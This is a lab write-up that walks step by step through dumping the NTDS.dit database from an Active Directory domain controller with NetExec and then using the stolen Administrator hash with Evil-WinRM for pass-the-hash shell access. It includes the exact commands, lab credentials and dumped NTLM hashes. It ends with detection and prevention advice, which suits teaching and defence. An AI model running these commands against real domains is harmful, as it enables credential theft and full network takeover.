# ntds Dumping

**Date:** June 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Credential Access <br>
**Difficulty:** Easy <br>
**Tools:** NetExec, Evil-winrm

## Table of Contents 

* [Introduction](#ntds-dumping)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Performing Token Impersonation & Privilege Escalation](#step-1--performing-token-impersonation-and-privilege-escallation)
* [Step 2 — Dumping NTDS with NetExec](#step-2--dumping-ntds-with-netexec)
* [Step 3 — Getting a Shell with Evil-WinRM](#step-3--getting-a-shell-with-evil-winrm)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

From an attacker’s perspective, NTDS dumping is one of the most important steps during an Active Directory attack.

After obtaining Domain Admin privileges, I was able to access the Domain Controller and extract the Active Directory database file (`NTDS.dit`). This file contains important domain information, including password hashes of user and computer accounts.

Instead of targeting a single user or machine, NTDS dumping allows an attacker to access the credential database of the entire domain. These hashes can then be used for further attacks such as Pass-the-Hash, offline password cracking, and gaining further access within the network.

## Attack Flow
```
Initial Domain Access
              ↓
Obtaining User-Level Access
              ↓
Performing Token Impersonation Attack
              ↓
Escalating Privileges to Domain Admin
              ↓
Using Domain Admin Credentials Against Domain Controller
              ↓
Dumping NTDS.dit Database with NetExec
              ↓
Extracting NTLM Password Hashes
              ↓
Obtaining Administrator Hash
              ↓
Performing Pass-the-Hash Attack
              ↓
Accessing Domain Controller with Evil-WinRM
              ↓
Getting Administrator Shell
              ↓
Full Domain Compromise
```

## Why This Attack Works

NTDS dumping works because the Active Directory database stores credential information for all domain accounts in the `NTDS.dit` file.

The `NTDS.dit` file is located on the Domain Controller and contains password hashes of users, computers, and service accounts. If an attacker gains Domain Admin privileges or enough access to the Domain Controller, they can extract these hashes.

The attack does not require knowing the actual passwords. The extracted NTLM hashes can be used for further attacks such as Pass-the-Hash, offline password cracking, or accessing other systems in the domain.

This attack is possible when:

- An attacker gains administrative privileges on the Domain Controller.
- Domain Admin accounts are not properly protected.
- Privileged account access is not monitored.
- Weak security controls allow unauthorized access to sensitive systems.
- NTLM authentication is still enabled and can be abused.

To reduce the risk, organizations should protect privileged accounts, limit administrative access, monitor unusual activity, and implement strong security controls across Active Directory.

## Lab Setup

| Machine | Role | IP Address |
|---------------------|----------------------|---------------|
| Windows Server 2022 | Domain Controller | `192.168.5.134` |
| Windows 10 | Domain User | `192.168.5.142` |
| Kali Linux | Attacker Machine | `192.168.5.128` |

## Tools Used

| Tool | Purpose |
|----------------|----------------------------------------------|
| `NetExec (NXC)` | Used to authenticate to the Domain Controller and dump NTDS hashes |
| `Evil-WinRM` | Used to access the Windows machine remotely using WinRM |

## Prerequisites

| What   | Why  |
|--------|------|
| Kali Linux machine | Used as the attacker machine for running security tools |
| Active Directory environment | Required for testing domain-based attacks |
| Domain Controller | Stores the Active Directory database (`NTDS.dit`) |
| Administrative or Domain Admin privileges | Required to access and dump NTDS hashes |
| Network connectivity | Required for communication between attacker and target systems |
| Enabled WinRM service | Required for remote access using Evil-WinRM |
| Authorization to test the environment | Ensures the activity is performed legally |

## What I Understood During the Process

While working on this technique, I realized that:

- NTDS.dit is the main database of Active Directory
- It stores all user accounts in the domain
- It contains password hashes (not plain passwords)
- These hashes can represent both normal users and privileged accounts

This made it clear that compromising this file is equivalent to gaining deep visibility into the entire domain environment.

## Step 1 — Performing Token Impersonation & Privilege Escalation

Before performing the NTDS dump, I first carried out a Token Impersonation attack to escalate my privileges within the domain.

During this phase, the `test` user account was added to the Domain Admins group. After successfully impersonating a privileged token, I gained administrative privileges and took control of the `test` account.

I then used the credentials of this Domain Admin account to authenticate and continue with the NTDS dumping process as part of the post-exploitation phase.

Before starting the attack, I already had valid domain credentials:

- user name: `test`
- password: `@shahin123#!`

## Step 2 — Dumping NTDS with NetExec

After obtaining Domain Admin privileges through Token Impersonation, I used the test account to dump the Active Directory database from the Domain Controller.

```bash
nxc smb 192.168.5.134 -u test -p '@shahin123#!' --ntds
```
**Flag Breakdown**

|         Flag        |  Description  |
|---------------------|----------------|
| `nxc`               | NetExec — a network penetration testing tool (successor to CrackMapExec)                        |
| `smb`               | Protocol being used — Server Message Block (SMB)                                                |
| `192.168.5.134`     | IP address of the target Domain Controller                                                      |
| `-u test`           | Username used for authentication                                                                |
| `-p '@shahin123#!'` | Password for the specified user                                                                 |
| `--ntds`            | Attempts to extract the NTDS.dit database, which contains Active Directory user password hashes |

When I executed the command, NetExec authenticated to the Domain Controller over SMB using the Domain Admin credentials and successfully dumped the contents of the NTDS.dit database.

The dump contained NTLM password hashes for domain users, built-in accounts, and computer accounts. These hashes can be used during post-exploitation for activities such as:

- Pass-the-Hash attacks using NTLM hashes.
- Offline password cracking with tools such as Hashcat.
- Extracting additional credential material for further assessment, depending on the environment and account configuration.

**Output:**

```
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\test:@shahin123#! (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.5.134   445    REDTEAMBD-DC     Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
SMB         192.168.5.134   445    REDTEAMBD-DC     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.134   445    REDTEAMBD-DC     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
SMB         192.168.5.134   445    REDTEAMBD-DC     REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
SMB         192.168.5.134   445    REDTEAMBD-DC     VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] Dumped 12 NTDS hashes to /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds of which 9 were added to the database
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] To extract only enabled accounts from the output file, run the following command: 
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] grep -iv disabled /root/.nxc/logs/ntds/REDTEAMBD-DC_192.168.5.134_2026-06-06_011030.ntds | cut -d ':' -f1
```
The command completed successfully and extracted the NTLM hashes from the Domain Controller, providing the credential material required for the next phase of the assessment.

<p align="center">
  <img src="/Active-Directory/07-ntds dump/images/step2.png" width="600">
</p>

## Step 3 — Getting a Shell with Evil-WinRM

After dumping the NTDS.dit and getting the Administrator hash, I used
Evil-WinRM to log into the Domain Controller directly using the hash —
no password needed.

```bash
evil-winrm -i 192.168.5.134 -u 'administrator' -H 'fc525c9683e8fe067095ba2ddc971889'
```

**Flag Breakdown**

| Flag | Description |
|-------------------------------|----------------------------------------------|
| `evil-winrm` | A tool used to connect to Windows machines remotely using the WinRM protocol. |
| `-i 192.168.5.134` | Specifies the IP address of the target machine. |
| `-u administrator` | Specifies the username used for authentication. |
| `-H 'fc525c9683e8fe067095ba2ddc971889'` | Uses the NTLM hash of the Administrator account for Pass-the-Hash authentication instead of using the password. |

This is a Pass the Hash attack. Instead of using the actual password, I used the NTLM hash I dumped earlier from NTDS.dit to log straight into the Domain Controller as Administrator — no cracking needed.
Once the command runs successfully, I get a full interactive shell on the Domain Controller.

**Output:**

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
readteambd\administrator
```

The command executed successfully, giving me an interactive PowerShell session on the Domain Controller with Domain Administrator privileges.

**Result:**

- Target IP     --> `192.168.5.134`                                
- User          --> `administrator`                                
- Hash Used     --> `fc525c9683e8fe067095ba2ddc971889`             
- Shell         --> Got a full PowerShell session as Administrator 
- Whoami Output --> `readteambd\administrator`                     

I successfully logged in as **Domain Administrator** without ever knowing the real password — just the hash was enough to own the box.

<p align="center">
  <img src="/Active-Directory/07-ntds dump/images/step3.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-------------------------------|----------------------------------------------|
| Unauthorized Domain Admin access | Check for users who suddenly get administrative privileges |
| Access to NTDS.dit | Monitor suspicious attempts to access Active Directory database files |
| Unusual SMB activity | Look for unknown systems connecting to the Domain Controller |
| Suspicious WinRM usage | Monitor unexpected remote PowerShell sessions |
| Pass-the-Hash activity | Check for login attempts using NTLM hashes |
| Privilege changes | Monitor changes to groups like Domain Admins |
| Security event logs | Review authentication and privilege-related events |

## How to Prevent It

- Give Domain Admin access only to trusted users.
- Use separate accounts for normal work and administrative tasks.
- Use strong passwords for administrator accounts.
- Enable Multi-Factor Authentication (MFA) for important accounts.
- Regularly check members of privileged groups.
- Disable unnecessary remote access services.
- Keep Domain Controllers updated and protected.
- Monitor unusual login activity.
- Limit access to sensitive Active Directory systems.

## References

| Category | Resource | Link |
|----------------|--------------------------------|----------------------------------------------|
| MITRE ATT&CK | OS Credential Dumping: NTDS (T1003.003) | https://attack.mitre.org/techniques/T1003/003/ |
| MITRE ATT&CK | Pass the Hash (T1550.002) | https://attack.mitre.org/techniques/T1550/002/ |
| Microsoft Docs | Active Directory Security Best Practices | https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory |
| Microsoft Docs | Windows Security Auditing | https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview |
| Tool | NetExec | https://github.com/Pennyw0rth/NetExec |
| Tool | Evil-WinRM | https://github.com/Hackplayers/evil-winrm |

## Lessons Learned

- The `NTDS.dit` file contains password hashes of all domain accounts.
- An attacker with Domain Admin access can dump the entire domain database.
- Password hashes can be used without knowing the original password.
- Pass-the-Hash attacks can give direct access to other systems.
- Protecting administrator accounts is very important in Active Directory.
- Regularly checking user permissions can prevent unauthorized access.
- Monitoring login activity can help find suspicious behavior early.

